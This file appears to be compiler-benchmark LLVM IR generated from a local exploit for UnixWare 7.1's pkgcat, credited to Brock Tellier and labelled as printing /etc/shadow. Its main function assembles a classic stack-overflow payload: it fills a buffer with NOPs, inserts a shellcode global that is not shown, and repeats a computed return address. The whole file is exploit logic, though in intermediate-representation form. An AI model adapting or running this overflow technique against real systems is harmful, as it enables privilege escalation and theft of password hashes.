; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_19660.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_19660.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"Error: Usage: %s offset buffer\0A\00", align 1
@.str.1 = private unnamed_addr constant [36 x i8] c"\0AUnixWare 7.1 pkgcat exploit prints\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/etc/shadow\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"Brock Tellier btellier@usa.net\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"Using addr: 0x%x\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@scoshell = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %6, align 8
  %12 = load i32, i32* @LEN, align 4
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* @LEN, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %10, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %11, align 8
  %17 = call i32 (...) @buildpi()
  %18 = load i32, i32* %4, align 4
  %19 = icmp sgt i32 %18, 3
  br i1 %19, label %20, label %27

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %21, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i8* %24)
  %26 = call i32 @exit(i32 0) #4
  unreachable

27:                                               ; preds = %2
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 2
  br i1 %29, label %30, label %36

30:                                               ; preds = %27
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i8* @atoi(i8* %33)
  %35 = ptrtoint i8* %34 to i64
  store i64 %35, i64* %6, align 8
  br label %52

36:                                               ; preds = %27
  %37 = load i32, i32* %4, align 4
  %38 = icmp eq i32 %37, 3
  br i1 %38, label %39, label %50

39:                                               ; preds = %36
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call i8* @atoi(i8* %42)
  %44 = ptrtoint i8* %43 to i64
  store i64 %44, i64* %6, align 8
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @atoi(i8* %47)
  %49 = ptrtoint i8* %48 to i32
  store i32 %49, i32* %8, align 4
  br label %51

50:                                               ; preds = %36
  store i64 100, i64* %6, align 8
  store i32 3000, i32* %8, align 4
  br label %51

51:                                               ; preds = %50, %39
  br label %52

52:                                               ; preds = %51, %30
  br label %53

53:                                               ; preds = %52
  %54 = load i64, i64* %6, align 8
  %55 = add nsw i64 134507381, %54
  store i64 %55, i64* %9, align 8
  %56 = load i32, i32* @stderr, align 4
  %57 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %58 = load i32, i32* @stderr, align 4
  %59 = call i32 (i32, i8*, ...) @fprintf(i32 %58, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %60 = load i32, i32* @stderr, align 4
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %62 = load i32, i32* @stderr, align 4
  %63 = load i64, i64* %9, align 8
  %64 = load i64, i64* %6, align 8
  %65 = add nsw i64 %63, %64
  %66 = call i32 (i32, i8*, ...) @fprintf(i32 %62, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i64 %65)
  %67 = load i32, i32* @NOP, align 4
  %68 = load i32, i32* %8, align 4
  %69 = call i32 @memset(i8* %16, i32 %67, i32 %68)
  %70 = load i32, i32* %8, align 4
  %71 = sdiv i32 %70, 2
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %16, i64 %72
  %74 = load i32, i32* @scoshell, align 4
  %75 = load i32, i32* @scoshell, align 4
  %76 = call i32 @strlen(i32 %75)
  %77 = call i32 @memcpy(i8* %73, i32 %74, i32 %76)
  %78 = load i32, i32* %8, align 4
  %79 = sdiv i32 %78, 2
  %80 = load i32, i32* @scoshell, align 4
  %81 = call i32 @strlen(i32 %80)
  %82 = add nsw i32 %79, %81
  %83 = add nsw i32 %82, 2
  store i32 %83, i32* %7, align 4
  br label %84

84:                                               ; preds = %96, %53
  %85 = load i32, i32* %7, align 4
  %86 = load i32, i32* %8, align 4
  %87 = sub nsw i32 %86, 4
  %88 = icmp slt i32 %85, %87
  br i1 %88, label %89, label %99

89:                                               ; preds = %84
  %90 = load i64, i64* %9, align 8
  %91 = trunc i64 %90 to i32
  %92 = load i32, i32* %7, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %16, i64 %93
  %95 = bitcast i8* %94 to i32*
  store i32 %91, i32* %95, align 1
  br label %96

96:                                               ; preds = %89
  %97 = load i32, i32* %7, align 4
  %98 = add nsw i32 %97, 4
  store i32 %98, i32* %7, align 4
  br label %84

99:                                               ; preds = %84
  %100 = load i32, i32* %8, align 4
  %101 = sub nsw i32 %100, 1
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %16, i64 %102
  store i8 58, i8* %103, align 1
  %104 = call i32 @printf(i8* %16)
  %105 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @buildpi(...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i8* @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @printf(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
